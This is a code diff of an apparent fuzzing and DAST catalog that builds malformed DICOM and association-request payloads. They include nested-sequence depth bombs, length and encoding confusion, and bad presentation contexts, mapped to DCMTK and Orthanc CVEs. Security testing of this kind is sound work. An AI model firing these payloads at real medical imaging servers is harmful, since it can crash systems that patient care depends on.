@@ -6,7 +6,7 @@ This module is a STATIC CATALOG of hand-built malformed DICOM payloads. It
 is not a fuzzing engine: there is no mutation loop and no coverage feedback.
 The catalog has two roles in C-SCARE:
   * Black-box DAST  - deliver payloads live at a target and watch for
-                      anomalies (see c_scare.deliver / test_runner).
+                      anomalies (see c_scare.deliver / runner).
   * Grey-box seeds  - write payloads to disk as the initial corpus for
                       AFL++ / AFLNet, which own the actual mutation loop.
 
@@ -20,6 +20,7 @@ Attack Categories:
     ProtocolAttacks    - Target network stack (PDUs, associations)
     MemoryAttacks      - Buffer overflows, allocation exhaustion
     LogicAttacks       - Semantic confusion, state violations
+    StorageSCPAbuseAttacks - Unauthenticated C-STORE import/storage abuse
     CommandInjectionAttacks - Shell injection via storescp exec placeholders
     PathTraversalAttacks - Directory traversal in stored DICOM filenames
     StateMachineAttacks - DICOM state machine (Sta1-Sta13) violations
@@ -43,6 +44,11 @@ Targeted (metadata['cve']):
     CVE-2024-33606  - SSRF via URI Value Representation
     CVE-2024-34509  - dcmdata segfault via invalid DIMSE message (black-box analogue)
     CVE-2026-5663   - OS command injection via storescp exec placeholders
+    CVE-2026-50003  - C-GET bit-preserving storage path traversal
+    CVE-2026-50254  - storescp association-request memory leak
+    CVE-2026-35505  - association-request memory leak in single-process SCPs
+    CVE-2026-52868  - worklist per-AE storage path traversal
+    CVE-2026-44628  - worklist crafted-query type confusion crash
     CVE-2015-8979   - DCMTK dcmnet/DUL string-handling overflow on the wire
                       (lineage: CVE-2019-1010228, CVE-2021-41689)
     CVE-2022-2121   - DCMTK NULL pointer dereference parsing a malformed file
@@ -71,6 +77,12 @@ Targeted (metadata['cve']):
     CVE-2026-5444   - Orthanc embedded-PAM image dimension overflow
     CVE-2026-5445   - Orthanc DecodeLookupTable palette index past LUT size
                       (Orthanc 5441..5445 are CERT/CC VU#536588, fixed in 1.12.11)
+    CVE-2026-50003  - DCMTK C-GET bit-preserving storage path traversal
+                      from a malicious SCP to a client/SCU
+    CVE-2026-50254  - DCMTK storescp crafted association request memory leak DoS
+    CVE-2026-35505  - DCMTK dcmnet crafted association request memory leak DoS
+    CVE-2026-52868  - DCMTK worklist filesystem cross-AE path traversal/read
+    CVE-2026-44628  - DCMTK worklist C-FIND type confusion crash
 
   Config-file CVEs exercised by the grey-box dcmqrscp track live under
   fuzz/configs/malformed/: CVE-2020-36855, CVE-2022-4981.
@@ -97,6 +109,7 @@ Example:
 
 from dataclasses import dataclass, field
 from typing import Any, Dict, Generator, List, Optional, Tuple, Union
+import base64
 import random
 import struct
 import os
@@ -112,6 +125,8 @@ try:
         DICOM, A_ASSOCIATE_RQ, A_ASSOCIATE_AC, A_ASSOCIATE_RJ,
         P_DATA_TF, A_RELEASE_RQ, A_RELEASE_RP, A_ABORT,
         C_ECHO_RQ, C_ECHO_RSP, C_STORE_RQ, C_FIND_RQ, C_MOVE_RQ,
+        N_CREATE_RQ, N_SET_RQ, N_ACTION_RQ, N_GET_RQ, N_DELETE_RQ,
+        N_EVENT_REPORT_RQ,
         PresentationDataValueItem, DICOMSocket,
         DICOMVariableItem, DICOMApplicationContext, DICOMUserInformation,
         DICOMPresentationContextRQ, DICOMAbstractSyntax, DICOMTransferSyntax,
@@ -120,6 +135,12 @@ try:
         DEFAULT_TRANSFER_SYNTAX_UID, VERIFICATION_SOP_CLASS_UID,
         CT_IMAGE_STORAGE_SOP_CLASS_UID, IMPLEMENTATION_CLASS_UID,
         MR_IMAGE_STORAGE_SOP_CLASS_UID, SECONDARY_CAPTURE_SOP_CLASS_UID,
+        MODALITY_WORKLIST_FIND_SOP_CLASS_UID,
+        MPPS_SOP_CLASS_UID, STORAGE_COMMITMENT_SOP_CLASS_UID,
+        STORAGE_COMMITMENT_SOP_INSTANCE_UID,
+        raw_ae_title, raw_item, raw_presentation_context,
+        raw_user_information, raw_associate_rq_with_items,
+        raw_associate_rq, raw_release_rq,
         _uid_to_bytes,
     )
     SCAPY_DICOM_AVAILABLE = True
@@ -130,6 +151,7 @@ except Exception:
     CT_IMAGE_STORAGE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.2'
     MR_IMAGE_STORAGE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.4'
     SECONDARY_CAPTURE_SOP_CLASS_UID = '1.2.840.10008.5.1.4.1.1.7'
+    MODALITY_WORKLIST_FIND_SOP_CLASS_UID = '1.2.840.10008.5.1.4.32.1'
     IMPLEMENTATION_CLASS_UID = '1.2.3.4.5.6.7.8.9'
 
 try:
@@ -148,11 +170,14 @@ __all__ = [
     # Attack pattern classes
     'ParserAttacks',
     'ProtocolAttacks',
+    'NegotiationAttacks',
     'MemoryAttacks',
     'LogicAttacks',
+    'StorageSCPAbuseAttacks',
     'CommandInjectionAttacks',
     'PathTraversalAttacks',
     'StateMachineAttacks',
+    'DimseNAttacks',
     'CVEAttacks',
     # Seed generators (corpus emitters for AFL++/AFLNet; not fuzzing engines)
     'ProtocolSeedGenerator',
@@ -263,6 +288,13 @@ class ParserAttacks:
             payload=data,
             description='Undefined length without sequence delimiter',
             expected_behavior='Parser should timeout or reject',
+            metadata={
+                'coverage_scope': 'undefined-length-handling',
+                'bug_class': 'unterminated-undefined-length',
+                'target_field': '(7FE0,0010) Pixel Data',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
         )
     
     @staticmethod
@@ -306,6 +338,12 @@ class ParserAttacks:
             payload=ds.encode(),
             description='Tags in descending order',
             expected_behavior='Parser should reject or sort',
+            metadata={
+                'coverage_scope': 'element-ordering',
+                'bug_class': 'descending-tag-order',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
         )
     
     @staticmethod
@@ -336,6 +374,13 @@ class ParserAttacks:
             payload=ds.encode(),
             description='Null bytes in PatientName',
             expected_behavior='Parser may truncate or include nulls',
+            metadata={
+                'coverage_scope': 'string-value-sanitization',
+                'bug_class': 'embedded-null-truncation',
+                'target_field': '(0010,0010) Patient Name',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
         )
     
     @staticmethod
@@ -423,6 +468,225 @@ class ParserAttacks:
         
         return results
 
+    # -------------------------------------------------------------------------
+    # Encoding-level confusion: the dataset disagrees with its declared syntax
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def sequence_depth_bomb(depth: int = 512) -> AttackResult:
+        """Sequences nested ``depth`` levels deep, all undefined-length.
+
+        Distinct from ``sequence_bomb``, which is wide rather than deep: a
+        recursive-descent parser recurses once per level here, so the cost is
+        stack rather than heap. Undefined lengths mean the depth is not
+        knowable until the parser has already descended.
+        """
+        item_tag = struct.pack('<HHI', 0xFFFE, 0xE000, 0xFFFFFFFF)
+        item_end = struct.pack('<HHI', 0xFFFE, 0xE00D, 0)
+        sq_open = struct.pack('<HH2sHI', 0x0040, 0xA730, b'SQ', 0, 0xFFFFFFFF)
+        sq_end = struct.pack('<HHI', 0xFFFE, 0xE0DD, 0)
+
+        payload = b''
+        for _ in range(depth):
+            payload = sq_open + item_tag + payload + item_end + sq_end
+        return AttackResult(
+            name='sequence_depth_bomb',
+            category='parser',
+            payload=payload,
+            description=f'Content Sequence nested {depth} levels deep, every '
+                        'level undefined-length',
+            expected_behavior='Parser should enforce a maximum nesting depth '
+                              'rather than recurse per level',
+            metadata={
+                'depth': depth,
+                'target_field': '(0040,A730) Content Sequence',
+                'bug_class': 'unbounded-recursion',
+                'coverage_scope': 'sequence-nesting-depth',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def explicit_vr_in_implicit_dataset() -> AttackResult:
+        """Explicit-VR elements inside a dataset declared Implicit VR.
+
+        Under Implicit VR the two bytes after the tag are the low half of a
+        32-bit length, so a VR of 'SH' reads as length 0x00004853 - about 18 KB
+        claimed from an element that carries 8.
+        """
+        payload = b''
+        payload += struct.pack('<HHI', 0x0008, 0x0016, 26) + \
+            SECONDARY_CAPTURE_SOP_CLASS_UID.encode('ascii')
+        payload += struct.pack('<HH2sH', 0x0010, 0x0010, b'SH', 8) + b'Doe^John'
+        payload += struct.pack('<HHI', 0x0010, 0x0020, 6) + b'ID0001'
+        return AttackResult(
+            name='explicit_vr_in_implicit_dataset',
+            category='parser',
+            payload=payload,
+            description='Implicit VR dataset containing one explicitly-typed '
+                        "element, whose VR bytes read as a ~18KB length",
+            expected_behavior='Parser must bound each element length by the '
+                              'remaining dataset rather than trusting it',
+            metadata={
+                'target_field': '(0010,0010) Patient Name',
+                'bug_class': 'transfer-syntax-confusion',
+                'coverage_scope': 'vr-encoding-confusion',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def byte_swapped_lengths() -> AttackResult:
+        """Big-endian element headers inside a little-endian dataset.
+
+        A length of 8 written big-endian reads as 0x0800 (2048) little-endian,
+        so every element overruns; this reaches the same code as a genuine
+        endianness misdetection without needing the peer to negotiate
+        Explicit VR Big Endian.
+        """
+        payload = b''
+        payload += struct.pack('>HH2sH', 0x0800, 0x0500, b'UI', 26) + \
+            SECONDARY_CAPTURE_SOP_CLASS_UID.encode('ascii')
+        payload += struct.pack('>HH2sH', 0x1000, 0x1000, b'PN', 8) + b'Doe^John'
+        return AttackResult(
+            name='byte_swapped_lengths',
+            category='parser',
+            payload=payload,
+            description='Element headers encoded big-endian inside a dataset '
+                        'declared little-endian',
+            expected_behavior='Parser should fail on the resulting overruns '
+                              'rather than read past the buffer',
+            metadata={
+                'bug_class': 'endianness-confusion',
+                'coverage_scope': 'byte-order-confusion',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def group_length_mismatch() -> AttackResult:
+        """A group length element that disagrees with the group it counts.
+
+        Group length elements are retired but still parsed. Code that trusts
+        one to size a group buffer, then copies the elements that actually
+        follow, has a mismatch to exploit in either direction.
+        """
+        group_body = struct.pack('<HH2sH', 0x0010, 0x0010, b'PN', 8) + b'Doe^John'
+        group_body += struct.pack('<HH2sH', 0x0010, 0x0020, b'LO', 6) + b'ID0001'
+        payload = struct.pack('<HH2sHI', 0x0010, 0x0000, b'UL', 4, 0xFFFFFF00)
+        payload += group_body
+        return AttackResult(
+            name='group_length_mismatch',
+            category='parser',
+            payload=payload,
+            description=f'(0010,0000) Group Length claims 0xFFFFFF00 bytes; the '
+                        f'group holds {len(group_body)}',
+            expected_behavior='Parser should ignore or re-derive group length, '
+                              'never size an allocation or copy from it',
+            metadata={
+                'target_field': '(0010,0000) Group Length',
+                'declared_length': 0xFFFFFF00,
+                'actual_length': len(group_body),
+                'bug_class': 'length-vs-content-mismatch',
+                'coverage_scope': 'group-length-handling',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def odd_length_values() -> AttackResult:
+        """Odd-length values, which PS3.5 7.1.1 forbids.
+
+        Every DICOM value is even-length; readers that assume it and step in
+        two-byte units lose tag alignment for the rest of the dataset, so each
+        subsequent element is read from the middle of the previous one.
+        """
+        payload = b''
+        payload += struct.pack('<HH2sH', 0x0010, 0x0010, b'PN', 7) + b'Doe^Joh'
+        payload += struct.pack('<HH2sH', 0x0010, 0x0020, b'LO', 5) + b'ID001'
+        payload += struct.pack('<HH2sH', 0x0008, 0x0060, b'CS', 3) + b'CTX'
+        return AttackResult(
+            name='odd_length_values',
+            category='parser',
+            payload=payload,
+            description='Three consecutive elements with odd value lengths '
+                        '(PS3.5 7.1.1 requires even padding)',
+            expected_behavior='Parser should reject odd lengths or realign '
+                              'without misreading the following elements',
+            metadata={
+                'bug_class': 'alignment-desync',
+                'coverage_scope': 'value-length-parity',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def sequence_delimiter_in_defined_length() -> AttackResult:
+        """Sequence Delimitation Item inside a defined-length sequence.
+
+        PS3.5 7.5 uses a delimiter only when the length is undefined. Here the
+        sequence declares its length *and* carries a delimiter, so a parser
+        that stops at whichever it sees first will disagree with one that
+        honors the other about where the sequence ends.
+        """
+        item_body = struct.pack('<HH2sH', 0x0008, 0x0060, b'CS', 2) + b'OT'
+        item = struct.pack('<HHI', 0xFFFE, 0xE000, len(item_body)) + item_body
+        delimiter = struct.pack('<HHI', 0xFFFE, 0xE0DD, 0)
+        trailing = struct.pack('<HH2sH', 0x0010, 0x0010, b'PN', 8) + b'Doe^John'
+        sq_body = item + delimiter + trailing
+        payload = struct.pack('<HH2sHI', 0x0040, 0xA730, b'SQ', 0, len(sq_body)) + sq_body
+        return AttackResult(
+            name='sequence_delimiter_in_defined_length',
+            category='parser',
+            payload=payload,
+            description='Defined-length sequence also carries a Sequence '
+                        'Delimitation Item, so its end is ambiguous',
+            expected_behavior='Parser should honor the defined length '
+                              'consistently and not resume outside the sequence',
+            metadata={
+                'target_field': '(0040,A730) Content Sequence',
+                'bug_class': 'sequence-boundary-ambiguity',
+                'coverage_scope': 'sequence-delimitation',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def private_creator_block_collision() -> AttackResult:
+        """Two private creators claiming the same reserved block.
+
+        PS3.5 7.8.1 gives each creator an exclusive block of 256 elements.
+        Two creators reserving 0x0010 means the elements in that block belong
+        to whichever the parser bound last, so a private element can be
+        attributed to the wrong vendor's handler.
+        """
+        payload = b''
+        payload += struct.pack('<HH2sH', 0x0009, 0x0010, b'LO', 8) + b'VENDOR_A'
+        payload += struct.pack('<HH2sH', 0x0009, 0x0010, b'LO', 8) + b'VENDOR_B'
+        payload += struct.pack('<HH2sH', 0x0009, 0x1001, b'OB', 4) + b'\xde\xad\xbe\xef'
+        return AttackResult(
+            name='private_creator_block_collision',
+            category='parser',
+            payload=payload,
+            description='Two private creators reserve block 0x0010 of group '
+                        '0x0009; one private element then follows',
+            expected_behavior='Parser should reject the duplicate reservation '
+                              'rather than silently rebind the block',
+            metadata={
+                'target_field': '(0009,0010) Private Creator',
+                'bug_class': 'private-block-rebinding',
+                'coverage_scope': 'private-creator-reservation',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
     @classmethod
     def all(cls) -> Generator[AttackResult, None, None]:
         """Yield every parser attack payload."""
@@ -437,6 +701,13 @@ class ParserAttacks:
         yield cls.format_string_injection()
         yield cls.path_traversal_in_string()
         yield cls.unicode_expansion()
+        yield cls.sequence_depth_bomb()
+        yield cls.explicit_vr_in_implicit_dataset()
+        yield cls.byte_swapped_lengths()
+        yield cls.group_length_mismatch()
+        yield cls.odd_length_values()
+        yield cls.sequence_delimiter_in_defined_length()
+        yield cls.private_creator_block_collision()
 
 
 # =============================================================================
@@ -454,15 +725,12 @@ class ProtocolAttacks:
     @staticmethod
     def malformed_protocol_version(version: int = 0xFFFF) -> AttackResult:
         """A-ASSOCIATE-RQ with invalid protocol version."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x01\x00' + struct.pack('!I', 68) + struct.pack('!H', version) + b'\x00' * 66
-        else:
-            pkt = DICOM() / A_ASSOCIATE_RQ(
-                protocol_version=version,
-                called_ae_title='TARGET',
-                calling_ae_title='ATTACKER',
-            )
-            payload = raw(pkt)
+        pkt = DICOM() / A_ASSOCIATE_RQ(
+            protocol_version=version,
+            called_ae_title='TARGET',
+            calling_ae_title='ATTACKER',
+        )
+        payload = raw(pkt)
         return AttackResult(
             name='malformed_protocol_version',
             category='protocol',
@@ -499,6 +767,11 @@ class ProtocolAttacks:
             payload=payload,
             description='PDU declares 10 bytes, 1000 present',
             expected_behavior='Target should detect length mismatch',
+            metadata={
+                'coverage_scope': 'pdu-length-handling',
+                'bug_class': 'length-vs-content-mismatch',
+                'declared_length': 10, 'actual_length': 1000,
+            },
         )
 
     @staticmethod
@@ -517,11 +790,8 @@ class ProtocolAttacks:
     @staticmethod
     def truncated_association() -> AttackResult:
         """A-ASSOCIATE-RQ truncated mid-packet."""
-        if not SCAPY_AVAILABLE:
-            full = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
-        else:
-            pkt = DICOM() / A_ASSOCIATE_RQ()
-            full = raw(pkt)
+        pkt = DICOM() / A_ASSOCIATE_RQ()
+        full = raw(pkt)
         payload = full[:len(full) // 2]
         return AttackResult(
             name='truncated_association',
@@ -529,42 +799,43 @@ class ProtocolAttacks:
             payload=payload,
             description='A-ASSOCIATE-RQ truncated mid-packet',
             expected_behavior='Target should handle incomplete PDU',
+            metadata={
+                'coverage_scope': 'pdu-truncation',
+                'bug_class': 'short-read',
+            },
         )
 
     @staticmethod
     def pdata_without_association() -> AttackResult:
         """P-DATA-TF sent without prior association."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
-        else:
-            cmd = C_ECHO_RQ(message_id=1)
-            pdv = PresentationDataValueItem(
-                context_id=1,
-                is_last=1, is_command=1,
-                data=raw(cmd),
-            )
-            pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
-            payload = raw(pkt)
+        cmd = C_ECHO_RQ(message_id=1)
+        pdv = PresentationDataValueItem(
+            context_id=1,
+            is_last=1, is_command=1,
+            data=raw(cmd),
+        )
+        pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
+        payload = raw(pkt)
         return AttackResult(
             name='pdata_without_association',
             category='protocol',
             payload=payload,
             description='P-DATA-TF without prior association',
             expected_behavior='Target should abort or ignore',
+            metadata={
+                'coverage_scope': 'association-state',
+                'bug_class': 'unassociated-data',
+            },
         )
 
     @staticmethod
     def double_association() -> AttackResult:
         """Two A-ASSOCIATE-RQ packets (second should fail)."""
-        if not SCAPY_AVAILABLE:
-            pdu = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
-            pdu1, pdu2 = pdu, pdu
-        else:
-            pkt = DICOM() / A_ASSOCIATE_RQ(
-                called_ae_title='TARGET',
-                calling_ae_title='ATTACKER',
-            )
-            pdu1, pdu2 = raw(pkt), raw(pkt)
+        pkt = DICOM() / A_ASSOCIATE_RQ(
+            called_ae_title='TARGET',
+            calling_ae_title='ATTACKER',
+        )
+        pdu1, pdu2 = raw(pkt), raw(pkt)
         return AttackResult(
             name='double_association',
             category='protocol',
@@ -577,73 +848,143 @@ class ProtocolAttacks:
     @staticmethod
     def overlong_ae_title() -> AttackResult:
         """A-ASSOCIATE-RQ with AE title > 16 chars."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x01\x00' + struct.pack('!I', 68) + b'X' * 20 + b'\x00' * 48
-        else:
-            pkt = DICOM() / A_ASSOCIATE_RQ(
-                called_ae_title=b'X' * 20,  # Should be max 16
-                calling_ae_title='ATTACKER',
-            )
-            payload = raw(pkt)
+        pkt = DICOM() / A_ASSOCIATE_RQ(
+            called_ae_title=b'X' * 20,  # Should be max 16
+            calling_ae_title='ATTACKER',
+        )
+        payload = raw(pkt)
         return AttackResult(
             name='overlong_ae_title',
             category='protocol',
             payload=payload,
             description='A-ASSOCIATE-RQ with AE title > 16 chars',
             expected_behavior='Target should reject overlong AE title',
+            metadata={
+                'coverage_scope': 'ae-title-handling',
+                'bug_class': 'fixed-field-overflow',
+                'target_field': 'Called AE Title',
+            },
         )
 
     @staticmethod
     def null_ae_titles() -> AttackResult:
         """A-ASSOCIATE-RQ with null AE titles."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 32 + b'\x00' * 36
-        else:
-            pkt = DICOM() / A_ASSOCIATE_RQ(
-                called_ae_title=b'\x00' * 16,
-                calling_ae_title=b'\x00' * 16,
-            )
-            payload = raw(pkt)
+        pkt = DICOM() / A_ASSOCIATE_RQ(
+            called_ae_title=b'\x00' * 16,
+            calling_ae_title=b'\x00' * 16,
+        )
+        payload = raw(pkt)
         return AttackResult(
             name='null_ae_titles',
             category='protocol',
             payload=payload,
             description='A-ASSOCIATE-RQ with null AE titles',
             expected_behavior='Target should reject null AE titles',
+            metadata={
+                'coverage_scope': 'ae-title-handling',
+                'bug_class': 'empty-identity',
+                'target_field': 'Called/Calling AE Title',
+            },
         )
 
     @staticmethod
     def missing_application_context() -> AttackResult:
         """A-ASSOCIATE-RQ without Application Context item."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
-        else:
-            variable_items = [
-                build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID]),
-                build_user_information(max_pdu_length=16384),
-            ]
-            pkt = DICOM() / A_ASSOCIATE_RQ(
-                called_ae_title='TARGET',
-                calling_ae_title='ATTACKER',
-                variable_items=variable_items,
-            )
-            payload = raw(pkt)
+        variable_items = [
+            build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID]),
+            build_user_information(max_pdu_length=16384),
+        ]
+        pkt = DICOM() / A_ASSOCIATE_RQ(
+            called_ae_title='TARGET',
+            calling_ae_title='ATTACKER',
+            variable_items=variable_items,
+        )
+        payload = raw(pkt)
         return AttackResult(
             name='missing_application_context',
             category='protocol',
             payload=payload,
             description='A-ASSOCIATE-RQ without Application Context',
             expected_behavior='Target should reject missing context',
+            metadata={
+                'coverage_scope': 'association-variable-items',
+                'bug_class': 'missing-mandatory-item',
+            },
+        )
+
+    @staticmethod
+    def duplicate_presentation_context_id() -> AttackResult:
+        """A-ASSOCIATE-RQ with two Presentation Contexts using the same ID."""
+        variable_items = raw_item(0x10, b'1.2.840.10008.3.1.1.1')
+        variable_items += raw_presentation_context(
+            CT_IMAGE_STORAGE_SOP_CLASS_UID, context_id=1)
+        variable_items += raw_presentation_context(
+            MR_IMAGE_STORAGE_SOP_CLASS_UID, context_id=1)
+        variable_items += raw_user_information()
+        payload = raw_associate_rq_with_items('STORESCP', 'C-SCARE-FZ', variable_items)
+        return AttackResult(
+            name='duplicate_presentation_context_id',
+            category='protocol',
+            payload=payload,
+            description='A-ASSOCIATE-RQ reuses Presentation Context ID 1 for two SOP classes',
+            expected_behavior='Target should reject duplicate presentation context IDs',
+            metadata={'coverage_scope': 'association-presentation-context-id'},
+        )
+
+    @staticmethod
+    def even_presentation_context_id() -> AttackResult:
+        """A-ASSOCIATE-RQ with even Presentation Context ID."""
+        payload = raw_associate_rq(
+            'STORESCP', 'C-SCARE-FZ', CT_IMAGE_STORAGE_SOP_CLASS_UID,
+            context_id=2)
+        return AttackResult(
+            name='even_presentation_context_id',
+            category='protocol',
+            payload=payload,
+            description='A-ASSOCIATE-RQ uses even Presentation Context ID 2',
+            expected_behavior='Target should reject non-odd presentation context IDs',
+            metadata={'coverage_scope': 'association-presentation-context-id'},
+        )
+
+    @staticmethod
+    def presentation_context_without_transfer_syntax() -> AttackResult:
+        """A-ASSOCIATE-RQ with Abstract Syntax but no Transfer Syntax."""
+        pc_payload = bytes([1, 0, 0, 0])
+        pc_payload += raw_item(0x30, CT_IMAGE_STORAGE_SOP_CLASS_UID.encode('ascii'))
+        variable_items = raw_item(0x10, b'1.2.840.10008.3.1.1.1')
+        variable_items += raw_item(0x20, pc_payload)
+        variable_items += raw_user_information()
+        payload = raw_associate_rq_with_items('STORESCP', 'C-SCARE-FZ', variable_items)
+        return AttackResult(
+            name='presentation_context_without_transfer_syntax',
+            category='protocol',
+            payload=payload,
+            description='A-ASSOCIATE-RQ Storage context has no Transfer Syntax item',
+            expected_behavior='Target should reject incomplete presentation context',
+            metadata={'coverage_scope': 'association-presentation-context-items'},
+        )
+
+    @staticmethod
+    def tiny_max_pdu_length() -> AttackResult:
+        """A-ASSOCIATE-RQ negotiates an impractically tiny Max PDU Length."""
+        user_info = raw_item(0x51, struct.pack('!I', 1))
+        payload = raw_associate_rq(
+            'STORESCP', 'C-SCARE-FZ', CT_IMAGE_STORAGE_SOP_CLASS_UID,
+            user_info_payload=user_info)
+        return AttackResult(
+            name='tiny_max_pdu_length',
+            category='protocol',
+            payload=payload,
+            description='A-ASSOCIATE-RQ offers Maximum Length of one byte',
+            expected_behavior='Target should reject or safely clamp tiny Max PDU Length',
+            metadata={'coverage_scope': 'association-user-information'},
         )
 
     @staticmethod
     def pdu_length_mismatch(inflate_by: int = 10000) -> AttackResult:
         """A-ASSOCIATE-RQ with length field inflated."""
-        if not SCAPY_AVAILABLE:
-            pdu = b'\x01\x00' + struct.pack('!I', 68) + b'\x00' * 68
-        else:
-            pkt = DICOM() / A_ASSOCIATE_RQ()
-            pdu = raw(pkt)
+        pkt = DICOM() / A_ASSOCIATE_RQ()
+        pdu = raw(pkt)
 
         actual_len = struct.unpack('!I', pdu[2:6])[0]
         payload = pdu[:2] + struct.pack('!I', actual_len + inflate_by) + pdu[6:]
@@ -659,33 +1000,31 @@ class ProtocolAttacks:
     @staticmethod
     def abort_injection() -> AttackResult:
         """A-ABORT packet for injecting mid-session."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x07\x00' + struct.pack('!I', 4) + b'\x00\x00\x00\x00'
-        else:
-            pkt = DICOM() / A_ABORT(source=0, reason_diag=0)
-            payload = raw(pkt)
+        pkt = DICOM() / A_ABORT(source=0, reason_diag=0)
+        payload = raw(pkt)
         return AttackResult(
             name='abort_injection',
             category='protocol',
             payload=payload,
             description='A-ABORT packet for mid-session injection',
             expected_behavior='Target should handle abort cleanly',
+            metadata={
+                'coverage_scope': 'association-teardown',
+                'bug_class': 'unsolicited-abort',
+            },
         )
 
     @staticmethod
     def wrong_context_id(context_id: int = 255) -> AttackResult:
         """P-DATA-TF with non-negotiated context ID."""
-        if not SCAPY_AVAILABLE:
-            payload = b'\x04\x00' + struct.pack('!I', 20) + bytes([context_id]) + b'\x00' * 19
-        else:
-            cmd = C_ECHO_RQ(message_id=1)
-            pdv = PresentationDataValueItem(
-                context_id=context_id,
-                is_last=1, is_command=1,
-                data=raw(cmd),
-            )
-            pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
-            payload = raw(pkt)
+        cmd = C_ECHO_RQ(message_id=1)
+        pdv = PresentationDataValueItem(
+            context_id=context_id,
+            is_last=1, is_command=1,
+            data=raw(cmd),
+        )
+        pkt = DICOM() / P_DATA_TF(pdv_items=[pdv])
+        payload = raw(pkt)
         return AttackResult(
             name='wrong_context_id',
             category='protocol',
@@ -704,16 +1043,13 @@ class ProtocolAttacks:
         CVE-2024-34508 is covered by the AFLNet net campaign, which mutates
         full DIMSE sessions on the network-receive path.
         """
-        if not SCAPY_AVAILABLE:
-            payload = b''
-        else:
-            cmd = C_STORE_RQ(
-                affected_sop_class_uid=CT_IMAGE_STORAGE_SOP_CLASS_UID,
-                affected_sop_instance_uid='1.2.3.4.5',
-                message_id=1,
-            )
-            cmd.command_field = 0xDEAD  # Invalid!
-            payload = raw(cmd)
+        cmd = C_STORE_RQ(
+            affected_sop_class_uid=CT_IMAGE_STORAGE_SOP_CLASS_UID,
+            affected_sop_instance_uid='1.2.3.4.5',
+            message_id=1,
+        )
+        cmd.command_field = 0xDEAD  # Invalid!
+        payload = raw(cmd)
         return AttackResult(
             name='invalid_command_field',
             category='protocol',
@@ -736,6 +1072,10 @@ class ProtocolAttacks:
         yield cls.overlong_ae_title()
         yield cls.null_ae_titles()
         yield cls.missing_application_context()
+        yield cls.duplicate_presentation_context_id()
+        yield cls.even_presentation_context_id()
+        yield cls.presentation_context_without_transfer_syntax()
+        yield cls.tiny_max_pdu_length()
         yield cls.pdu_length_mismatch()
         yield cls.abort_injection()
         yield cls.wrong_context_id()
@@ -985,6 +1325,12 @@ class LogicAttacks:
             payload=file_data,
             description='Meta says Explicit VR, data is Implicit VR',
             expected_behavior='Parser should detect encoding mismatch',
+            metadata={
+                'coverage_scope': 'negotiated-syntax-enforcement',
+                'bug_class': 'syntax-vs-encoding-mismatch',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
         )
     
     @staticmethod
@@ -1001,6 +1347,12 @@ class LogicAttacks:
             payload=ds.encode(),
             description='Claims CT Image but missing CT elements',
             expected_behavior='Validator should reject',
+            metadata={
+                'coverage_scope': 'sop-class-enforcement',
+                'bug_class': 'sop-class-confusion',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
         )
     
     @staticmethod
@@ -1016,6 +1368,12 @@ class LogicAttacks:
             payload=ds.encode(),
             description='Private tag (0009,1001) without (0009,0010) creator',
             expected_behavior='Parser may misinterpret VR',
+            metadata={
+                'coverage_scope': 'private-creator-reservation',
+                'bug_class': 'unreserved-private-element',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
         )
     
     @staticmethod
@@ -1125,6 +1483,249 @@ def _payload_lookup(payloads, payload_id: str, kind: str) -> Tuple[str, str]:
 
 
 # =============================================================================
+# Storage SCP Abuse - unauthenticated C-STORE import/storage side effects
+# =============================================================================
+
+class StorageSCPAbuseAttacks:
+    """
+    Attacks targeting the broader unauthenticated Storage SCP surface.
+
+    These are not path traversal payloads. They probe what happens when any
